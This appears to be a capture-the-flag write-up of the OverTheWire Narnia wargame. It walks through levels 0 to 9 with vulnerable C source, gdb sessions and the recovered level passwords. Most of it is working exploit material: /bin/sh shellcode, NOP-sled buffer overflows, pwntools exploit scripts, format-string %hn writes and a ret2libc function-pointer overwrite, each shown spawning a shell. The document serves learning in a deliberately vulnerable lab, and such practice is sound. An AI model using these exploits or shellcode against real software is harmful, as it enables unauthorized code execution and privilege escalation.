# NARNIA
---
---
---

Useful commands on this wargame:

```bash
--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro 

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/
    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh
```


```bash
# start GDB peda
$ gdb
(gdb) source /usr/local/peda/peda.py
gdb-peda$ 

```


```bash
# connect

ssh narnia0@narnia.labs.overthewire.org -p 2226

# username: narnia0
# password: narnia0

```

## Narnia0

-> simple buffer overflow
Source
```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

Buffer overflow, probably the *val* variable is located after *buf* on the stack.
Using the string *AAAAAAAAAAAAAAAAAAAABBBB* modifies *val* to 0x42424242; so we have to write 0xdeadbeef instead of 0x42424242.
Because of little-endian architecture, we first have to write 0xde, then 0xad etc.

```bash
narnia0@narnia:/narnia$ (printf "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat;)| ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1

cat /etc/narnia_pass/narnia1
efeidiedae
```

## Narnia1 - password: efeidiedae

-> using an environment variable
```bash
ssh narnia1@narnia.labs.overthewire.org -p 2226
```

Source
```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

A function pointer is set with the address of the environment variable we provide. The function is then called.
Put shellcode in an env variable, which is then executed.
```bash
narnia1@narnia:/narnia$ export EGG=$(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
nairiepecu
```

## Narnia2 - password: nairiepecu

-> buffer overflow with no restrictions
```bash
ssh narnia2@narnia.labs.overthewire.org -p 2226
```

Source
```c
#include <stdio.h>
#include <string.h>	
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

We see a buffer overflow here *strcpy(buf,argv[1]);*, because *argv[1]* can have any length.

We also see we have an executable stack.
```bash
:/narnia$ /usr/local/bin/checksec.sh --file narnia2
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   narnia2
```


### One possible approach, put shellcode in an env variable along with a NOP sled and try to predict its address.
```bash

narnia2@narnia:/narnia$ export SHELLCODE=$(python -c 'print "\x90"*32 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')

narnia2@narnia:/narnia$ /tmp/cezarp/get_env SHELLCODE AAAA

# address of env var: 0xffffde95

# add 16 and land somewhere whithin the NOP sled

0xffffde95 + 16 = 0xFFFFDEA5


narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print "A"*128 + "\xa5\xde\xff\xff"*32 ')
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
vaequeezee

```


get_env.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char* argv[])
{
    char *p;
    //find the address of an env variable

    if(argc < 3)
    {
        printf("Usage: %s <environment var> <target program name> \n", argv[0]);
        exit(0);
    }
    p = getenv(argv[1]);

    printf("%s will be at %p\n", argv[1], p);
}
```

### Another possible approach, without the use of an envinroment variable, place shellcode on the stack and try to get its location

We have to write over 128 chars to overflow the buffer.
Let's find the offset of the return pointer.
The return pointer seems to return into "CCCC", so the offset is just 4.

```bash


# breaks before and after strcpy

gdb-peda$ break *0x0804847d
Breakpoint 1 at 0x804847d
gdb-peda$ break *0x08048483
Breakpoint 2 at 0x8048483

run $(python -c 'print "A"*128 + "B"*4 + "C"*4 + "D"*4 + "E"*4 + "F"*4')

# Using a shellcode of 23 bytes, with 60 bytes of NOPs, 83 bytes.
# We have to fill a buffer of 128, so we need one more character to make it alligned. Then reapeat the return address 128-84 = 44 times to fill the stack.
# We do 50 to make sure to overflow the return pointer

run $(python -c 'print "\90"*60 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + A + "ADDRESS"*50 ')

# We pick a random address from the stack from gdb like: 0xffffd64c, add 120 to it and get 0xFFFFD6C4 and then subtract offsets until we reach an address in the NOP sled.
# Let's make a BASH script

# We can add 30 every time because of the 60 byte sled, with no fear of missing it.
# 30 is no an alligned address, but we just want to get in the NOP sled.

# I wrote a c script to exploit the program with different offsets.

narnia2@narnia:/tmp/cezarp$ for i in $(seq 0 30 400)
> do
> echo Trying offset $i
> ./nr2 $i
> done
Trying offset 0
Segmentation fault
Trying offset 30
Illegal instruction
Trying offset 60
Segmentation fault
Trying offset 90
Segmentation fault
Trying offset 120
Illegal instruction
Trying offset 150
Segmentation fault
Trying offset 180
$ whoami
narnia3

```

```c
/// nr2.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h> ///For the execl function
char buffer[160];
char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
int main(int argc, char *argv[])
{
    unsigned int ret = 0xffffd6c4;

    if(argc != 2)
    {
        printf("Usage %s <offset>", argv[0]);
        return 1;
    }
    int offset = atoi(argv[1]);

    for(int i=0; i<90; i++)
        buffer[i] = '\x90';///NOP sled
    strcpy(buffer+90,  shellcode); ///Put in shellcode
    
    unsigned int i;
    for(i=90+strlen(shellcode); i%4!=0; i++)
        buffer[i] = 'A'; ///make it alligned

    ret = ret - offset;
    for(;i<160; i+=4)
        *((unsigned int *)(buffer+i)) = ret;
    ///write the return address many times

    execl("/narnia/narnia2", "narnia2", buffer, 0);

}
```


## Narnia3 - password: vaequeezee

-> buffer overflow using symbolic links in linux
```bash
ssh narnia3@narnia.labs.overthewire.org -p 2226
```

Source
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```

The vulnerability seems to be here, a stack buffer overflow:
```c
strcpy(ifile, argv[1]);
```
But the main function never returns, so overwriting the return pointer isn't an option.
Also, providing a payload that is not a valid file name woud make the program exit with *exit(-1)*, which is the same as the exit in main really.

Also the stack is not executable anymore.
```bash
narnia3@narnia:/narnia$ /usr/local/bin/checksec.sh --file narnia3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   narnia3
```

The *ifile[]* buffer is 32 bytes in size.


It looks like we can overwrite the *ofile[]*, we could provide the *ifile* as */etc/narnia_pass/narnia4* and the *ofile* something that we own, like */tmp/cezarp/narnia4_pass*.
This string has *24* characters, which means we will overwrite the *ofile* array, after adding an additional (32-24=8) chars, spaces work because they are not taken into consideration in filename interpretation.

```bash
narnia3@narnia:/tmp/cezarPP$ /narnia/narnia3 '/etc/narnia_pass/narnia4'
copied contents of /etc/narnia_pass/narnia4 to a safer place... (/dev/null)
narnia3@narnia:/tmp/cezarPP$ /narnia/narnia3 '/etc/narnia_pass/narnia4 '
error opening /etc/narnia_pass/narnia4
```

It lookes like spaces aren't allowed...
...

We should have a continuous sequence of which only the end is the second file, while the whole is the first file.
```bash
narnia3@narnia:/tmp$ mkdir AAAAAAAAAAAAAABBBBBBAAAAAAB
narnia3@narnia:/tmp$ cd AAAAAAAAAAAAAABBBBBBAAAAAAB
narnia3@narnia:/tmp/AAAAAAAAAAAAAABBBBBBAAAAAAB$ mkdir tmp
narnia3@narnia:/tmp/AAAAAAAAAAAAAABBBBBBAAAAAAB$ cd tmp
narnia3@narnia:/tmp/AAAAAAAAAAAAAABBBBBBAAAAAAB/tmp$ mkdir cezarPP
narnia3@narnia:/tmp/AAAAAAAAAAAAAABBBBBBAAAAAAB/tmp$ cd cezarPP
narnia3@narnia:/tmp/AAAAAAAAAAAAAABBBBBBAAAAAAB/tmp/cezarPP$ 
narnia3@narnia:/tmp/AAAAAAAAAAAAAABBBBBBAAAAAAB/tmp/cezarPP$ ln -s /etc/narnia_pass/narnia4 wow
narnia3@narnia:/tmp/AAAAAAAAAAAAAABBBBBBAAAAAAB/tmp/cezarPP$ /narnia/narnia3 "/tmp/AAAAAAAAAAAAAABBBBBBAAAAAAB/tmp/cezarPP/wow"
copied contents of /tmp/AAAAAAAAAAAAAABBBBBBAAAAAAB/tmp/cezarPP/wow to a safer place... (/tmp/cezarPP/wow)

narnia3@narnia:/tmp/cezarPP$ cat wow
thaenohtai
```

## Narnia 4 - password : thaenohtai

-> buffer overflow with no restrictions
```bash
ssh narnia4@narnia.labs.overthewire.org -p 2226
```

Source:
```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```
Extern keyword means that memory is not allocated to the variable right away (for function it is implicit)


```bash
narnia4@narnia:/tmp/cezarPPP$ checksec /narnia/narnia4
[*] '/narnia/narnia4'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
I learned how to use pwntools.
I determined the offset using cyclic() and cyclic_find() from pwntools.

```python
#!/usr/bin/python

from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'

shellcode = '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
offset = 264
nop_len = 256 - len(shellcode)

ret = 0xffffd5e5 #random address of the stack got when using gdb

for i in range(0, 10):
    payload = nop_len*'\x90' + shellcode + 'AAAAAAAA' + p32(ret)
    # alternatively payload = nop_len*'\x90' + shellcode + p32(ret)*5
    p = process(['/narnia/narnia4', payload])
    ret = ret - 64
    p.interactive()

```

```bash
narnia4@narnia:/tmp/cezarPPP$ ./exp.py 
[+] Starting local process '/narnia/narnia4': pid 4880
[*] Switching to interactive mode
[*] Process '/narnia/narnia4' stopped with exit code -11 (SIGSEGV) (pid 4880)
[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive
[+] Starting local process '/narnia/narnia4': pid 4885
[*] Switching to interactive mode
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
faimahchiy
```

## Narnia5 - password : faimahchiy

-> format string vulnerability
```bash
ssh narnia5@narnia.labs.overthewire.org -p 2226
```

Source:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
        int i = 1;
        char buffer[64];

        snprintf(buffer, sizeof(buffer), argv[1]);
        buffer[sizeof (buffer) - 1] = 0;
        printf("Change i's value from 1 -> 500. ");

        if(i==500){
                printf("GOOD\n");
        setreuid(geteuid(),geteuid());
                system("/bin/sh");
        }

        printf("No way...let me give you a hint!\n");
        printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
        printf ("i = %d (%p)\n", i, &i);
        return 0;
}
```

The *snprintf()* function is vulnerable, because the third argument is a format string. Here is the man page:
```c
int snprintf(char *str, size_t size, const char *format, ...);
```

We are also given the address of *i*, which is always the same:
```bash
narnia5@narnia:/narnia$ ./narnia5
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [] (0)
i = 1 (0xffffd6f0)
narnia5@narnia:/narnia$ ./narnia5
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [] (0)
i = 1 (0xffffd6f0)
narnia5@narnia:/narnia$ cd /tmp
narnia5@narnia:/tmp$ mkdir Cezarp
narnia5@narnia:/tmp$ cd Cezarp
narnia5@narnia:/tmp/Cezarp$ /narnia/narnia5
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [] (0)
i = 1 (0xffffd6e0)

narnia5@narnia:/tmp/Cezarp$ /usr/local/bin/checksec.sh --file /narnia/narnia5
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /narnia/narnia5

```

The stack is not executable, but it doen't matter since we have to just modify the value of *i* to get a shell.


```bash
narnia5@narnia:/narnia$ ./narnia5 AAAA%08x.%08x.%08x.%08x.%08x.%08x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAA41414141.31343134.31343134.3331332e.33313334.31332e34] (57)
i = 1 (0xffffd6d0)
```
It looks like with the first format parameter we print directly from the format string.
The *snprinf()* function, evaluates all of the format string, but does only copy n bytes to it to buffer, which doesn't matter in our case.

```bash
narnia5@narnia:/tmp/CezarPP$ ./exp.py 
��\xff\xff%496x%1$hn
[+] Starting local process '/narnia/narnia5': pid 16382
[*] Switching to interactive mode
Change i's value from 1 -> 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
neezocaeng
```

## Narnia6 - password : neezocaeng
-> overwriting function pointers

```bash
ssh narnia6@narnia.labs.overthewire.org -p 2226
```

Source:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
        char b1[8], b2[8];
        int  (*fp)(char *)=(int(*)(char *))&puts, i;

        if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

        /* clear environ */
        for(i=0; environ[i] != NULL; i++)
                memset(environ[i], '\0', strlen(environ[i]));
        /* clear argz    */
        for(i=3; argv[i] != NULL; i++)
                memset(argv[i], '\0', strlen(argv[i]));

        strcpy(b1,argv[1]);
        strcpy(b2,argv[2]);
        //if(((unsigned long)fp & 0xff000000) == 0xff000000)
        if(((unsigned long)fp & 0xff000000) == get_sp())
                exit(-1);
        setreuid(geteuid(),geteuid());
    fp(b1);

        exit(1);
}

```

```bash
narnia6@narnia:/narnia$ /usr/local/bin/checksec.sh --file /narnia/narnia6
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /narnia/narnia6
```
The stack is not executable, so we should maybe do a ret2libc attack. It looks like we can overwrite the *fp function pointer*, we could replace it with *system()*.

```bash
narnia6@narnia:/narnia$ gdb -q /narnia/narnia6
Reading symbols from /narnia/narnia6...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x80485ac
(gdb) r 
Starting program: /narnia/narnia6 

Breakpoint 1, 0x080485ac in main ()
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e4c850 <system>

```
Testing by hand, it looks like system takes as argument what is in the second buffer.
```bash
narnia6@narnia:/narnia$ ./narnia6 AAAA $(printf "AAAAAAAAsh;BCCCC\x50\xc8\xe4\xf7")
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
ahkiaziphu

# This also works
/narnia/narnia6 AAAA $(printf "AAAAAAAA/bin/sh;\x50\xc8\xe4\xf7")
```

## Narnia7 - password : ahkiaziphu
-> format string vuln
```bash
ssh narnia7@narnia.labs.overthewire.org -p 2226
```

Source:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof(buffer), format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
            fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}
```
```c
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

gdb-peda$ x/x $ebp-0x84
0xffffd628:     0x080486ff

# where to overwrite
```
Find the offset of our string on the stack.
```bash
gdb-peda$ r 'AAAA%x%x%x%x'
Starting program: /narnia/narnia7 'AAAA%x%x%x%x'
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd628)
I guess you want to come to the hackedfunction...
[----------------------------------registers-----------------------------------]
EAX: 0x23 ('#')
EBX: 0x0 
ECX: 0x7fffffdc 
EDX: 0xffffd64f --> 0x0 
ESI: 0x2 
EDI: 0xf7fc5000 --> 0x1b2db0 
EBP: 0xffffd6ac --> 0xffffd6b8 --> 0x0 
ESP: 0xffffd61c --> 0xffffd62c ("AAAA80486ff414141413834303834666636")
EIP: 0x80486b2 (<vuln+151>:     add    esp,0xc)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80486a9 <vuln+142>:        lea    eax,[ebp-0x80]
   0x80486ac <vuln+145>:        push   eax
   0x80486ad <vuln+146>:        call   0x8048500 <snprintf@plt>
=> 0x80486b2 <vuln+151>:        add    esp,0xc
   0x80486b5 <vuln+154>:        mov    eax,DWORD PTR [ebp-0x84]
   0x80486bb <vuln+160>:        call   eax
   0x80486bd <vuln+162>:        leave  
   0x80486be <vuln+163>:        ret
[------------------------------------stack-------------------------------------]
0000| 0xffffd61c --> 0xffffd62c ("AAAA80486ff414141413834303834666636")
0004| 0xffffd620 --> 0x80 
0008| 0xffffd624 --> 0xffffd892 ("AAAA%x%x%x%x")
0012| 0xffffd628 --> 0x80486ff (<goodfunction>: push   ebp)
0016| 0xffffd62c ("AAAA80486ff414141413834303834666636")
0020| 0xffffd630 ("80486ff414141413834303834666636")
0024| 0xffffd634 ("6ff414141413834303834666636")
0028| 0xffffd638 ("14141413834303834666636")
[------------------------------------------------------------------------------]

````

```python
#!/usr/bin/python
from pwn import *

ptr = 0xffffd648
payload = p32(ptr) +'%34592x'  + '%hn' 

p = process(['/narnia/narnia7', payload])

p.interactive()#!/usr/bin/python
from pwn import *

ptr = 0xffffd648
payload = p32(ptr) +'%34592x'  + '%hn' 

p = process(['/narnia/narnia7', payload])

p.interactive()
```
```bash
narnia7@narnia:/tmp/CEZARPP$ ./exp.py 
[+] Starting local process '/narnia/narnia7': pid 30407
[*] Switching to interactive mode
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd648)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whoami
narnia8
$ cat /etc/narnia_pass/narnia8
mohthuphog
```

## Narnia8 - password: mohthuphog
-> stack buffer overflow
```bash
ssh narnia8@narnia.labs.overthewire.org -p 2226
```

Source:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// gcc's variable reordering fucked things up
// to keep the level in its old style i am
// making "i" global until i find a fix
// -morla
int i;

void func(char *b){
        char *blah=b;
        char bok[20];
        //int i=0;

        memset(bok, '\0', sizeof(bok));
        for(i=0; blah[i] != '\0'; i++)
                bok[i]=blah[i];

        printf("%s\n",bok);
}

int main(int argc, char **argv){

        if(argc > 1)
                func(argv[1]);
        else
        printf("%s argument\n", argv[0]);

        return 0;
}
```

```bash
narnia8@narnia:/narnia$ checksec narnia8
[*] '/narnia/narnia8'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
```bash
narnia8@narnia:/narnia$ ./narnia8 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAA��h����2���
```
Overflowing the buffer normally doen't SEGFAULT, we should look into that.


```c
Address of the string on the stack when using gdb: 0xffffd84a
```
```bash
EAX: 0x14 
EBX: 0x0 
ECX: 0x13 
EDX: 0x14 
ESI: 0x2 
EDI: 0xf7fc5000 --> 0x1b2db0 
EBP: 0xffffd65c --> 0xffffd668 --> 0x0 
ESP: 0xffffd644 ('A' <repeats 20 times>, "J\330\377\377h\326\377\377\247\204\004\bJ\330\377\377")
EIP: 0x8048448 (<func+45>:      mov    edx,DWORD PTR ds:0x80497b0)
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048437 <func+28>: mov    DWORD PTR ds:0x80497b0,0x0
   0x8048441 <func+38>: jmp    0x8048469 <func+78>
   0x8048443 <func+40>: mov    eax,ds:0x80497b0
=> 0x8048448 <func+45>: mov    edx,DWORD PTR ds:0x80497b0
   0x804844e <func+51>: mov    ecx,edx
   0x8048450 <func+53>: mov    edx,DWORD PTR [ebp-0x4]
   0x8048453 <func+56>: add    edx,ecx
   0x8048455 <func+58>: movzx  edx,BYTE PTR [edx]
[------------------------------------stack-------------------------------------]
0000| 0xffffd644 ('A' <repeats 20 times>, "J\330\377\377h\326\377\377\247\204\004\bJ\330\377\377")
0004| 0xffffd648 ('A' <repeats 16 times>, "J\330\377\377h\326\377\377\247\204\004\bJ\330\377\377")
0008| 0xffffd64c ('A' <repeats 12 times>, "J\330\377\377h\326\377\377\247\204\004\bJ\330\377\377")
0012| 0xffffd650 ("AAAAAAAAJ\330\377\377h\326\377\377\247\204\004\bJ\330\377\377")
0016| 0xffffd654 ("AAAAJ\330\377\377h\326\377\377\247\204\004\bJ\330\377\377")
0020| 0xffffd658 --> 0xffffd84a ('A' <repeats 20 times>, "\035\330\377\377\035\330\377\377I\330\377\377I\330\377\377", '\220' <repeats 16 times>, "hhh\353\374hj\vX1\322Rh//shh/bin\211\343RS\211\341\353", <incomplete sequence \341>)
0024| 0xffffd65c --> 0xffffd668 --> 0x0 
0028| 0xffffd660 --> 0x80484a7 (<main+23>:      add    esp,0x4)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x08048448 in func ()
gdb-peda$ x/24wx $esp
0xffffd644:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd654:     0x41414141      0xffffd84a      0xffffd668      0x080484a7
0xffffd664:     0xffffd84a      0x00000000      0xf7e2a286      0x00000002
0xffffd674:     0xffffd704      0xffffd710      0x00000000      0x00000000
0xffffd684:     0x00000000      0xf7fc5000      0xf7ffdc0c      0xf7ffd000
0xffffd694:     0x00000000      0x00000002      0xf7fc5000      0x00000000
```
Analyzing with gdb we see that when overflowing we overwrite the pointer that is used to read characters from our string that is on the stack, meaning we have to keep that as it is, while overwriting the return pointer, which is after 2 addresses. After that we can put shellcode on the stack, and if we have guessed correctly the address that we have to keep we will guess correctly the address of the shellcode. A NOP sled makes everything even easier.
```python
#!/usr/bin/python

from pwn import *

address = 0xffffd84a
address-=64
shellcode = '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

i = 0
while(i < 512):
    address+=i
    ret = address + 44
    print(hex(address))
    payload = 'A'*20 + p32(address) +  p32(ret)*2 + p32(address) + '\x90'*16 + shellcode
    p = process(['/narnia/narnia8', payload])
    p.interactive()
    address-=i
```

```bash
[*] Got EOF while sending in interactive
0xffffd842
[+] Starting local process '/narnia/narnia8': pid 8984
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAB\xffn\xffn\xffB\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901Qh//shh/bin\x89
$                       whoami
narnia9
$ cat /etc/narnia_pass/narnia9
eiL5fealae
```

## Narnia9 - password : eiL5fealae

Done!